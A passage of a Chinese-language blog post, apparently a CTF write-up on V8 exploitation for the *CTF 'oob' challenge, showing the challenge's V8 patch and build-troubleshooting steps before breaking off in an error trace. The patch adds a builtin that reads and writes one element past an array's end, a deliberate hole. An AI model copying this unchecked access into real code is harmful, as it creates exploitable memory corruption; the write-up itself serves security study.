@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Sl0th">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://sloth31.github.io/2024/11/14/v8-pwn入门-2-——-ctf-oob/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x00 环境配置🔧oob.diff1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V8-pwn入门(2)——[*CTF]oob">
+<meta property="og:url" content="http://sloth31.github.io/2024/11/14/V8-pwn%E5%85%A5%E9%97%A8-2-%E2%80%94%E2%80%94-CTF-oob/index.html">
+<meta property="og:site_name" content="Sl0th&#39;s Blog">
+<meta property="og:description" content="0x00 环境配置🔧oob.diff1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sloth31.github.io/images/image-20241115180840728.png">
+<meta property="og:image" content="http://sloth31.github.io/images/image-20241115181021063.png">
+<meta property="article:published_time" content="2024-11-14T04:52:03.000Z">
+<meta property="article:modified_time" content="2024-11-21T08:00:54.332Z">
+<meta property="article:author" content="Sl0th">
+<meta property="article:tag" content="js-engine">
+<meta property="article:tag" content="v8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://sloth31.github.io/images/image-20241115180840728.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/fav.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/fav.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/fav.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            V8-pwn入门(2)——[*CTF]oob | Sl0th&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/day.jpg","dark":"/images/night.jpg"},"title":"Welcome to Sl0th's Blog","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/fav.ico" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Sl0th&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">47</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">V8-pwn入门(2)——[*CTF]oob</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.JPG">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-14 12:52:03</span>
+        <span class="mobile">2024-11-14 12:52:03</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-21 16:54</span>
+            <span class="mobile">2024-11-21 16:54</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/pwn/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/js-engine/">js-engine</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/v8/">v8</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="0x00-环境配置🔧"><a href="#0x00-环境配置🔧" class="headerlink" title="0x00 环境配置🔧"></a>0x00 环境配置🔧</h2><h3 id="oob-diff"><a href="#oob-diff" class="headerlink" title="oob.diff"></a>oob.diff</h3><div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"></span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>编译v8,在v8目录下</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -f</span><br><span class="line">gclient sync</span><br><span class="line">git apply oob.diff</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
+
+<p>如果报错，说明找不到python命令，可以&#x2F;usr&#x2F;bin目录下创个软链接（尽量链接到python2，python3后续还会报错）</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 4653, <span class="keyword">in</span> main</span><br><span class="line">    <span class="built_in">return</span> dispatcher.execute(OptionParser(), argv)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/subcommand.py&quot;</span>, line 254, <span class="keyword">in</span> execute</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">command</span>(parser, args[1:])</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 4006, <span class="keyword">in</span> CMDsync</span><br><span class="line">    ret = client.RunOnDeps(<span class="string">&#x27;update&#x27;</span>, args)</span><br><span class="line">          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 2517, <span class="keyword">in</span> RunOnDeps</span><br><span class="line">    self.RunHooksRecursively(self._options, pm)</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 1473, <span class="keyword">in</span> RunHooksRecursively</span><br><span class="line">    hook.run()</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient.py&quot;</span>, line 256, <span class="keyword">in</span> run</span><br><span class="line">    gclient_utils.CheckCallAndFilter(cmd,</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/gclient_utils.py&quot;</span>, line 640, <span class="keyword">in</span> CheckCallAndFilter</span><br><span class="line">    kid = subprocess2.Popen(args,</span><br><span class="line">          ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/depot_tools/subprocess2.py&quot;</span>, line 158, <span class="keyword">in</span> __init__</span><br><span class="line">    raise OSError(</span><br><span class="line">OSError: Execution failed with error: [Errno 2] No such file or directory: <span class="string">&#x27;python&#x27;</span>.</span><br><span class="line">Check that /root/v8 or python exist and have execution permission.</span><br></pre></td></tr></table></figure></div>
+
+<p>解决</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s $(<span class="built_in">which</span> python2) /usr/bin/python</span><br></pre></td></tr></table></figure></div>
+
+<p>如果报错</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar (child): xz: Cannot exec: No such file or directory</span><br><span class="line">tar (child): Error is not recoverable: exiting now</span><br><span class="line">tar: Child returned status 2</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure></div>
+
+<p>解决</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xz-utils</span><br></pre></td></tr></table></figure></div>
+
+<p>如果报错</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 246, in &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 141, in main</span><br><span class="line">    prefix = GetPkgConfigPrefixToStrip(options, args)</span><br><span class="line">  File &quot;/home/fuzz/Fuzzing_v8_75/v8/build/config/linux/pkg-config.py&quot;, line 80, in GetPkgConfigPrefixToStrip</span><br><span class="line">    &quot;--variable=prefix&quot;] + args, env=os.environ)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 216, in check_output</span><br><span class="line">    process = Popen(stdout=PIPE, *popenargs, **kwargs)</span><br><span 